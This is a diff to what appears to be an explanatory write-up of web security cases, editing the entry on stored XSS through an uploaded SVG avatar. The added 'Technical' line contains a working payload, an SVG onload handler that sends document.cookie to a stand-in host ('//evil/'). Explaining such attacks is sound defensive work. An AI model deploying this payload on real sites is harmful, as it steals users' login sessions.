@@ -99,7 +99,7 @@ Each case has a PNG in [`illustrations/`](illustrations/). Case **#1** uses **tw
 
 **Plain language:** On a profile, the bio stays ordinary text. The user only attaches an avatar. That file is an SVG. When someone opens the profile, the script inside the avatar runs and can steal the login session.
 
-**Technical:** Upload `image/svg+xml` with `onload` / `<script>` → served inline or at a direct URL on the same origin → stored XSS (`<img>` often does **not** run the script).
+**Technical:** The attached file is `image/svg+xml`. Its body is `<svg onload="new Image().src='//evil/?c='+document.cookie">`. The server stores `/uploads/avatar.svg` and serves it on the same origin, so opening the profile sends the session cookie. An `<img>` tag often does **not** run that script.
 
 ---
 
